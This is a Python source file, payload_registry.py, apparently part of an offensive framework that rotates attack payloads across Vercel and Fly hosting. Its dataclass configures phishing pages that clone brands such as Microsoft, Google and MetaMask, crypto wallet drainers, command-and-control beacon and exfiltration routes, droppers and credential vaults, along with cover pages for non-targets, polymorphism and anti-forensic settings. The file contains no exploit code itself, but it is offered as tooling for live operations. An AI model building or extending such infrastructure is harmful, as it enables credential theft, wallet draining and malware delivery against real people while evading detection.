# payload_registry.py — Defines active payloads per rotation cycle
# The rotation engine reads this to know what to deploy on Vercel vs Fly VM

from dataclasses import dataclass
from typing import Any, Literal, Optional
import json


@dataclass
class PayloadDefinition:
    """
    A single payload definition. The framework uses this to decide:
    - Where to serve it (Vercel static vs Fly VM dynamic)
    - How to render it (polymorphic engine)
    - What cover content to show to non-targets
    """

    id: str
    payload_type: Literal[
        "phishing",             # fake login page
        "drainer",              # crypto wallet drainer
        "malware_api",          # C2 tasking/exfil endpoint
        "stager",               # first-stage dropper
        "credential_vault",     # exfil ingestion + storage
        "telemetry_platform",   # full-stack app (Express + React + Postgres) — flipper
        "custom",               # anything else
    ]
    serve_on: Literal["vercel", "fly", "both"]

    # Telemetry platform config (flipper)
    docker_image: Optional[str] = None       # e.g. "registry.fly.io/chimera-flipper:latest"
    vm_memory_mb: Optional[int] = None       # override default VM memory (flipper needs more)
    vm_machine_type: Optional[str] = None    # e.g. "shared-cpu-2x" for heavier workloads

    # Phishing/drainer config
    target_brand: Optional[str] = None       # "microsoft", "google", "metamask", etc.
    target_url: Optional[str] = None         # real site to clone/proxy
    post_action: Optional[str] = None        # what to do after capture (store, redirect, etc.)

    # Malware API config
    api_routes: Optional[list[str]] = None   # ["/api/beacon", "/api/exfil", "/api/task"]
    auth_method: Optional[str] = None        # "session_key", "bearer", "none"

    # OPSEC
    cover_page: Optional[str] = None         # what non-targets see
    polymorphic: bool = True                 # vary structure every deployment
    anti_forensic: bool = True               # no disk writes, no logs

    # Custom payload
    custom_html: Optional[str] = None
    custom_js: Optional[str] = None
    custom_config: Optional[dict[str, Any]] = None


class PayloadRegistry:
    """
    Manages the set of active payloads for a rotation cycle.
    Loaded from a config file that the operator controls.
    """

    def __init__(self) -> None:
        self._payloads: list[PayloadDefinition] = []

    def add(self, payload: PayloadDefinition) -> None:
        self._payloads.append(payload)

    def get_by_type(self, ptype: str) -> list[PayloadDefinition]:
        return [p for p in self._payloads if p.payload_type == ptype]

    def get_vercel_payloads(self) -> list[PayloadDefinition]:
        return [p for p in self._payloads if p.serve_on in ("vercel", "both")]

    def get_fly_payloads(self) -> list[PayloadDefinition]:
        return [p for p in self._payloads if p.serve_on in ("fly", "both")]

    def to_json(self) -> str:
        return json.dumps([p.__dict__ for p in self._payloads], indent=2)

    @classmethod
    def from_json(cls, data: str) -> "PayloadRegistry":
        reg = cls()
        for item in json.loads(data):
            reg.add(PayloadDefinition(**item))
        return reg
